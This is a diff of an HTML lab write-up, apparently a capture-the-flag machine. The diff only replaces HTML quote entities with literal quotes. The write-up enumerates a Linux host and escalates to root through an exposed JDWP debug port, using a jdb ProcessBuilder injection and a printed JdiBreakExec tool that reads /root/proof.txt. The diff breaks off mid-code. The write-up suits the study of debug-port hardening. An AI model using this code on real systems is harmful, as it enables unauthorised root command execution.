-<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>ss<span class="w"> </span>-ltnp<span class="w"> </span><span class="m">2</span>&gt;/dev/null<span class="w"> </span><span class="p">|</span><span class="w"> </span>sed<span class="w"> </span><span class="s1">&#39;s/  */ /g&#39;</span>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>ss<span class="w"> </span>-ltnp<span class="w"> </span><span class="m">2</span>&gt;/dev/null<span class="w"> </span><span class="p">|</span><span class="w"> </span>sed<span class="w"> </span><span class="s1">'s/  */ /g'</span>
 </pre></div>
 <div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">State Recv-Q Send-Q Local Address:Port Peer Address:Port Process
 LISTEN 0 4096 127.0.0.53%lo:53 0.0.0.0:*
@@ -1148,7 +1148,7 @@ drwxr-xr-x 4 root root     4096 Nov  7  2022 ..
 enough to read carefully.</p>
 <p><strong>On the target</strong></p>
 <div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>cat<span class="w"> </span>/opt/dev/CHANGELOG
-python3<span class="w"> </span>-c<span class="w"> </span><span class="s2">&quot;import zipfile;print(&#39;\n&#39;.join(n for n in zipfile.ZipFile(&#39;/opt/dev/api.jar&#39;).namelist() if &#39;commons-text&#39; in n))&quot;</span>
+python3<span class="w"> </span>-c<span class="w"> </span><span class="s2">"import zipfile;print('\n'.join(n for n in zipfile.ZipFile('/opt/dev/api.jar').namelist() if 'commons-text' in n))"</span>
 </pre></div>
 <div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">## Changelog
 
@@ -1168,9 +1168,9 @@ response echo was always a red herring.</p>
 <p>Before committing to the debug port, everything conventional:</p>
 <p><strong>On the target</strong></p>
 <div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>sudo<span class="w"> </span>-n<span class="w"> </span>-l<span class="w"> </span><span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>head<span class="w"> </span>-3
-find<span class="w"> </span>/<span class="w"> </span>-perm<span class="w"> </span>-4000<span class="w"> </span>-type<span class="w"> </span>f<span class="w"> </span><span class="m">2</span>&gt;/dev/null<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-v<span class="w"> </span><span class="s1">&#39;^/snap&#39;</span>
+find<span class="w"> </span>/<span class="w"> </span>-perm<span class="w"> </span>-4000<span class="w"> </span>-type<span class="w"> </span>f<span class="w"> </span><span class="m">2</span>&gt;/dev/null<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-v<span class="w"> </span><span class="s1">'^/snap'</span>
 getcap<span class="w"> </span>-r<span class="w"> </span>/<span class="w"> </span><span class="m">2</span>&gt;/dev/null
-grep<span class="w"> </span>-E<span class="w"> </span><span class="s1">&#39;sh$&#39;</span><span class="w"> </span>/etc/passwd
+grep<span class="w"> </span>-E<span class="w"> </span><span class="s1">'sh$'</span><span class="w"> </span>/etc/passwd
 </pre></div>
 <div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">sudo: a password is required
 /usr/libexec/polkit-agent-helper-1
@@ -1238,7 +1238,7 @@ privilege boundary, and it is deliberate.</p>
 <p><code>/opt/stats/App.java</code> is world-readable. It is also the file the root JVM was launched with:</p>
 <p><strong>On the target</strong></p>
 <div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>cat<span class="w"> </span>/opt/stats/App.java
-cat<span class="w"> </span>/proc/698/cmdline<span class="w"> </span><span class="p">|</span><span class="w"> </span>tr<span class="w"> </span><span class="s1">&#39;\0&#39;</span><span class="w"> </span><span class="s1">&#39; &#39;</span><span class="p">;</span><span class="w"> </span>echo
+cat<span class="w"> </span>/proc/698/cmdline<span class="w"> </span><span class="p">|</span><span class="w"> </span>tr<span class="w"> </span><span class="s1">'\0'</span><span class="w"> </span><span class="s1">' '</span><span class="p">;</span><span class="w"> </span>echo
 </pre></div>
 <div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.IOException</span><span class="p">;</span>
 <span class="kn">import</span><span class="w"> </span><span class="nn">java.io.InputStream</span><span class="p">;</span>
@@ -1248,22 +1248,22 @@ cat<span class="w"> </span>/proc/698/cmdline<span class="w"> </span><span class=
 
 <span class="kd">class</span> <span class="nc">StatsApp</span><span class="w"> </span><span class="p">{</span>
 <span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
-<span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&quot;System Stats\n&quot;</span><span class="p">);</span>
+<span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">"System Stats\n"</span><span class="p">);</span>
 <span class="w">        </span><span class="n">Runtime</span><span class="w"> </span><span class="n">rt</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Runtime</span><span class="p">.</span><span class="na">getRuntime</span><span class="p">();</span>
 <span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">output</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">String</span><span class="p">();</span>
 
 <span class="w">        </span><span class="k">try</span><span class="w"> </span><span class="p">{</span>
 <span class="w">            </span><span class="n">ServerSocket</span><span class="w"> </span><span class="n">echod</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ServerSocket</span><span class="p">(</span><span class="mi">5000</span><span class="p">);</span>
 <span class="w">            </span><span class="k">while</span><span class="w"> </span><span class="p">(</span><span class="kc">true</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
-<span class="w">              </span><span class="n">output</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&quot;&quot;</span><span class="p">;</span>
-<span class="w">              </span><span class="n">output</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="s">&quot;Available Processors: &quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">rt</span><span class="p">.</span><span class="na">availableProcessors</span><span class="p">()</span><span class="w"> </span><span class="o">+</span><span class="s">&quot;\r\n&quot;</span><span class="p">;</span>
-<span class="w">              </span><span class="n">output</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="s">&quot;Free Memory: &quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">rt</span><span class="p">.</span><span class="na">freeMemory</span><span class="p">()</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s">&quot;\r\n&quot;</span><span class="p">;</span>
-<span class="w">              </span><span class="n">output</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="s">&quot;Total Memory: &quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">rt</span><span class="p">.</span><span class="na">totalMemory</span><span class="p">()</span><span class="w"> </span><span class="o">+</span><span class="s">&quot;\r\n&quot;</span><span class="p">;</span>
+<span class="w">              </span><span class="n">output</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">""</span><span class="p">;</span>
+<span class="w">              </span><span class="n">output</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="s">"Available Processors: "</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">rt</span><span class="p">.</span><span class="na">availableProcessors</span><span class="p">()</span><span class="w"> </span><span class="o">+</span><span class="s">"\r\n"</span><span class="p">;</span>
+<span class="w">              </span><span class="n">output</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="s">"Free Memory: "</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">rt</span><span class="p">.</span><span class="na">freeMemory</span><span class="p">()</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s">"\r\n"</span><span class="p">;</span>
+<span class="w">              </span><span class="n">output</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="s">"Total Memory: "</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">rt</span><span class="p">.</span><span class="na">totalMemory</span><span class="p">()</span><span class="w"> </span><span class="o">+</span><span class="s">"\r\n"</span><span class="p">;</span>
 
 <span class="w">              </span><span class="n">Socket</span><span class="w"> </span><span class="n">socket</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">echod</span><span class="p">.</span><span class="na">accept</span><span class="p">();</span>
 <span class="w">              </span><span class="n">InputStream</span><span class="w"> </span><span class="n">in</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">socket</span><span class="p">.</span><span class="na">getInputStream</span><span class="p">();</span>
 <span class="w">              </span><span class="n">OutputStream</span><span class="w"> </span><span class="n">out</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">socket</span><span class="p">.</span><span class="na">getOutputStream</span><span class="p">();</span>
-<span class="w">              </span><span class="n">out</span><span class="p">.</span><span class="na">write</span><span class="p">((</span><span class="n">output</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s">&quot;\r\n&quot;</span><span class="p">).</span><span class="na">getBytes</span><span class="p">());</span>
+<span class="w">              </span><span class="n">out</span><span class="p">.</span><span class="na">write</span><span class="p">((</span><span class="n">output</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s">"\r\n"</span><span class="p">).</span><span class="na">getBytes</span><span class="p">());</span>
 <span class="w">              </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">output</span><span class="p">);</span>
 <span class="w">            </span><span class="p">}</span>
 <span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">IOException</span><span class="w"> </span><span class="n">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
@@ -1355,9 +1355,9 @@ you get when you get them wrong is a bare <code>INVALID_THREAD</code> (JDWP erro
 <h3>6.2 Attempt 1 — <code>jdb</code></h3>
 <p>The JDK ships a command-line debugger, and it is right there in <code>/usr/bin/jdb</code>:</p>
 <p><strong>On the target</strong></p>
-<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>jdb<span class="w"> </span>-attach<span class="w"> </span><span class="m">8000</span><span class="w"> </span><span class="s">&lt;&lt;&#39;EOF&#39;</span>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>jdb<span class="w"> </span>-attach<span class="w"> </span><span class="m">8000</span><span class="w"> </span><span class="s">&lt;&lt;'EOF'</span>
 <span class="s">threads</span>
-<span class="s">print new java.lang.ProcessBuilder(&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;id &gt; /tmp/jdwp_probe&quot;).start()</span>
+<span class="s">print new java.lang.ProcessBuilder("/bin/bash","-c","id &gt; /tmp/jdwp_probe").start()</span>
 <span class="s">exit</span>
 <span class="s">EOF</span>
 </pre></div>
@@ -1374,7 +1374,7 @@ Initializing jdb ...
 command only evaluates inside a <em>current frame</em> — attaching to a running VM without stopping it does
 not give you one. Re-tried with <code>thread main</code> and <code>eval</code>:</p>
 <p><strong>On the target</strong></p>
-<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>jdb<span class="w"> </span>-attach<span class="w"> </span><span class="m">8000</span><span class="w"> </span><span class="s">&lt;&lt;&#39;EOF&#39;</span>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>jdb<span class="w"> </span>-attach<span class="w"> </span><span class="m">8000</span><span class="w"> </span><span class="s">&lt;&lt;'EOF'</span>
 <span class="s">eval java.lang.Runtime.getRuntime().availableProcessors()</span>
 <span class="s">exit</span>
 <span class="s">EOF</span>
@@ -1543,10 +1543,10 @@ ls<span class="w"> </span>-l<span class="w"> </span>/tmp/JdiBreakExec.class
 <p><strong>On the target</strong></p>
 <div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="nb">cd</span><span class="w"> </span>/tmp
 java<span class="w"> </span>--add-modules<span class="w"> </span>jdk.jdi<span class="w"> </span>JdiBreakExec<span class="w"> </span><span class="m">127</span>.0.0.1<span class="w"> </span><span class="m">8000</span><span class="w"> </span><span class="se">\</span>
-<span class="w">  </span><span class="s1">&#39;bash -c id&gt;/tmp/r_id;cat${IFS}/root/proof.txt&gt;/tmp/r_proof&#39;</span>
-<span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;RC=</span><span class="nv">$?</span><span class="s2">&quot;</span>
-<span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;== id ==&quot;</span><span class="p">;</span><span class="w"> </span>cat<span class="w"> </span>/tmp/r_id
-<span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;== proof ==&quot;</span><span class="p">;</span><span class="w"> </span>cat<span class="w"> </span>/tmp/r_proof
+<span class="w">  </span><span class="s1">'bash -c id&gt;/tmp/r_id;cat${IFS}/root/proof.txt&gt;/tmp/r_proof'</span>
+<span class="nb">echo</span><span class="w"> </span><span class="s2">"RC=</span><span class="nv">$?</span><span class="s2">"</span>
+<span class="nb">echo</span><span class="w"> </span><span class="s2">"== id =="</span><span class="p">;</span><span class="w"> </span>cat<span class="w"> </span>/tmp/r_id
+<span class="nb">echo</span><span class="w"> </span><span class="s2">"== proof =="</span><span class="p">;</span><span class="w"> </span>cat<span class="w"> </span>/tmp/r_proof
 </pre></div>
 <div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">[*] attached to OpenJDK 64-Bit Server VM 11.0.16
 [*] breakpoint set at java.lang.String.getBytes
@@ -1597,40 +1597,40 @@ expanded by <code>bash</code> after the split, so the string stays one token as 
 <span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">host</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">args</span><span class="o">[</span><span class="mi">0</span><span class="o">]</span><span class="p">;</span>
 <span class="w">        </span><span class="kt">int</span><span class="w"> </span><span class="n">port</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Integer</span><span class="p">.</span><span class="na">parseInt</span><span class="p">(</span><span class="n">args</span><span class="o">[</span><span class="mi">1</span><span class="o">]</span><span class="p">);</span>
 <span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">command</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">args</span><span class="o">[</span><span class="mi">2</span><span class="o">]</span><span class="p">;</span>
-<span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">breakClass</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">args</span><span class="p">.</span><span class="na">length</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mi">3</span><span class="w"> </span><span class="o">?</span><span class="w"> </span><span class="n">args</span><span class="o">[</span><span class="mi">3</span><span class="o">]</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s">&quot;java.lang.String&quot;</span><span class="p">;</span>
-<span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">breakMethod</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">args</span><span class="p">.</span><span class="na">length</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mi">4</span><span class="w"> </span><span class="o">?</span><span class="w"> </span><span class="n">args</span><span class="o">[</span><span class="mi">4</span><span class="o">]</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s">&quot;getBytes&quot;</span><span class="p">;</span>
-<span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">breakSig</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">args</span><span class="p">.</span><span class="na">length</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mi">5</span><span class="w"> </span><span class="o">?</span><span class="w"> </span><span class="n">args</span><span class="o">[</span><span class="mi">5</span><span class="o">]</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s">&quot;()[B&quot;</span><span class="p">;</span>
+<span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">breakClass</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">args</span><span class="p">.</span><span class="na">length</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mi">3</span><span class="w"> </span><span class="o">?</span><span class="w"> </span><span class="n">args</span><span class="o">[</span><span class="mi">3</span><span class="o">]</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s">"java.lang.String"</span><span class="p">;</span>
+<span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">breakMethod</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">args</span><span class="p">.</span><span class="na">length</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mi">4</span><span class="w"> </span><span class="o">?</span><span class="w"> </span><span class="n">args</span><span class="o">[</span><span class="mi">4</span><span class="o">]</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s">"getBytes"</span><span class="p">;</span>
+<span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">breakSig</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">args</span><span class="p">.</span><span class="na">length</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mi">5</span><span class="w"> </span><span class="o">?</span><span class="w"> </span><span class="n">args</span><span class="o">[</span><span class="mi">5</span><span class="o">]</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s">"()[B"</span><span class="p">;</span>
 
 <span class="w">        </span><span class="n">AttachingConnector</span><span class="w"> </span><span class="n">conn</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">null</span><span class="p">;</span>
 <span class="w">        </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="n">AttachingConnector</span><span class="w"> </span><span class="n">c</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="n">Bootstrap</span><span class="p">.</span><span class="na">virtualMachineManager</span><span class="p">().</span><span class="na">attachingConnectors</span><span class="p">())</span><span class="w"> </span><span class="p">{</span>
-<span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="s">&quot;com.sun.jdi.SocketAttach&quot;</span><span class="p">.</span><span class="na">equals</span><span class="p">(</span><span class="n">c</span><span class="p">.</span><span class="na">name</span><span class="p">()))</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="s">"com.sun.jdi.SocketAttach"</span><span class="p">.</span><span class="na">equals</span><span class="p">(</span><span class="n">c</span><span class="p">.</span><span class="na">name</span><span class="p">()))</span><span class="w"> </span><span class="p">{</span>
 <span class="w">                </span><span class="n">conn</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">c</span><span class="p">;</span>
 <span class="w">            </span><span class="p">}</span>
 <span class="w">        </span><span class="p">}</span>
 <span class="w">        </span><span class="n">Map</span><span class="o">&lt;</span><span class="n">String</span><span class="p">,</span><span class="w"> </span><span class="n">Connector</span><span class="p">.</span><span class="na">Argument</span><span class="o">&gt;</span><span class="w"> </span><span class="n">cargs</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">conn</span><span class="p">.</span><span class="na">defaultArguments</span><span class="p">();</span>
-<span class="w">        </span><span class="n">cargs</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="s">&quot;hostname&quot;</span><span class="p">).</span><span class="na">setValue</span><span class="p">(</span><span class="n">host</span><span class="p">);</span>
-<span class="w">        </span><span class="n">cargs</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="s">&quot;port&quot;</span><span class="p">).</span><span class="na">setValue</span><span class="p">(</span><span class="n">String</span><span class="p">.</span><span class="na">valueOf</span><span class="p">(</span><span class="n">port</span><span class="p">));</span>
+<span class="w">        </span><span class="n">cargs</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="s">"hostname"</span><span class="p">).</span><span class="na">setValue</span><span class="p">(</span><span class="n">host</span><span class="p">);</span>
+<span class="w">        </span><span class="n">cargs</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="s">"port"</span><span class="p">).</span><span class="na">setValue</span><span class="p">(</span><span class="n">String</span><span class="p">.</span><span class="na">valueOf</span><span class="p">(</span><span class="n">port</span><span class="p">));</span>
 <span class="w">        </span><span class="n">VirtualMachine</span><span class="w"> </span><span class="n">vm</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">conn</span><span class="p">.</span><span class="na">attach</span><span class="p">(</span><span class="n">cargs</span><span class="p">);</span>
-<span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&quot;[*] attached to &quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">vm</span><span class="p">.</span><span class="na">name</span><span class="p">()</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s">&quot; &quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">vm</span><span class="p">.</span><span class="na">version</span><span class="p">());</span>
+<span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">"[*] attached to "</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">vm</span><span class="p">.</span><span class="na">name</span><span class="p">()</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s">" "</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">vm</span><span class="p">.</span><span class="na">version</span><span class="p">());</span>
 
 <span class="w">        </span><span class="n">ReferenceType</span><span class="w"> </span><span class="n">target</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">null</span><span class="p">;</span>
 <span class="w">        </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="n">ReferenceType</span><span class="w"> </span><span class="n">rt</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="n">vm</span><span class="p">.</span><span class="na">classesByName</span><span class="p">(</span><span class="n">breakClass</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
 <span class="w">            </span><span class="n">target</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">rt</span><span class="p">;</span>
 <span class="w">        </span><span class="p">}</span>
 <span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">target</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="kc">null</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
-<span class="w">            </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">IllegalStateException</span><span class="p">(</span><span class="s">&quot;breakpoint class not loaded: &quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">breakClass</span><span class="p">);</span>
+<span class="w">            </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">IllegalStateException</span><span class="p">(</span><span class="s">"breakpoint class not loaded: "</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">breakClass</span><span class="p">);</span>
 <span class="w">        </span><span class="p">}</span>
 <span class="w">        </span><span class="n">Method</span><span class="w"> </span><span class="n">bm</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">null</span><span class="p">;</span>
 <span class="w">        </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="n">Method</span><span class="w"> </span><span class="n">m</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="n">target</span><span class="p">.</span><span class="na">methodsByName</span><span class="p">(</span><span class="n">breakMethod</span><span class="p">,</span><span class="w"> </span><span class="n">breakSig</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
 <span class="w">            </span><span class="n">bm</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">m</span><span class="p">;</span>
 <span class="w">        </span><span class="p">}</span>
 <span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">bm</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="kc">null</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
-<span class="w">            </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">IllegalStateException</span><span class="p">(</span><span class="s">&quot;breakpoint method not found&quot;</span><span class="p">);</span>
+<span class="w">            </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">IllegalStateException</span><span class="p">(</span><span class="s">"breakpoint method not found"</span><span class="p">);</span>
 <span class="w">        </span><span class="p">}</span>
 <span class="w">        </span><span class="n">BreakpointRequest</span><span class="w"> </span><span class="n">bp</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">vm</span><span class="p">.</span><span class="na">eventRequestManager</span><span class="p">().</span><span class="na">createBreakpointRequest</span><span class="p">(</span><span class="n">bm</span><span class="p">.</span><span class="na">location</span><span class="p">());</span>
 <span class="w">        </span><span class="n">bp</span><span class="p">.</span><span class="na">setSuspendPolicy</span><span class="p">(</span><span class="n">EventRequest</span><span class="p">.</span><span class="na">SUSPEND_EVENT_THREAD</span><span class="p">);</span>
 <span class="w">        </span><span class="n">bp</span><span class="p">.</span><span class="na">enable</span><span class="p">();</span>
-<span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&quot;[*] breakpoint set at &quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">breakClass</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s">&quot;.&quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">breakMethod</span><span class="p">);</span>
+<span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">"[*] breakpoint set at "</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">breakClass</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s">"."</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">breakMethod</span><span class="p">);</span>
 
 <span class="w">        </span><span class="c1">// Clear the attach-time and startup suspend counts (suspend=y JVMs).</span>
 <span class="w">        </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">3</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
@@ -1639,13 +1639,13 @@ expanded by <code>bash</code> after the split, so the string stays one token as 
 <span class="w">            </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">Exception</span><span class="w"> </span><span class="n">ignored</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
 <span class="w">            </span><span class="p">}</span>
 <span class="w">        </span><span class="p">}</span>
-<span class="w">        </span><span class="c1">// Unblock the target&#39;s accept() so the post-accept code path runs.</span>
+<span class="w">        </span><span class="c1">// Unblock the target's accept() so the post-accept code path runs.</span>
 <span class="w">        </span><span class="k">new</span><span class="w"> </span><span class="n">Thread</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">Runnable</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
 <span class="w">            </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">run</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
 <span class="w">                </span><span class="k">try</span><span class="w"> </span><span class="p">{</span>
 <span class="w">                    </span><span class="n">Thread</span><span class="p">.</span><span class="na">sleep</span><span class="p">(</span><span class="mi">1000</span><span class="p">);</span>
-<span class="w">                    </span><span class="n">java</span><span class="p">.</span><span class="na">net</span><span class="p">.</span><span class="na">Socket</span><span class="w"> </span><span class="n">s</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">java</span><span class="p">.</span><span class="na">net</span><span class="p">.</span><span class="na">Socket</span><span class="p">(</span><span class="s">&quot;127.0.0.1&quot;</span><span class="p">,</span><span class="w"> </span><span class="mi">5000</span><span class="p">);</span>
-<span class="w">                    </span><span class="n">s</span><span class="p">.</span><span class="na">getOutputStream</span><span class="p">().</span><span class="na">write</span><span class="p">(</span><span class="sc">&#39;x&#39;</span><span class="p">);</span>
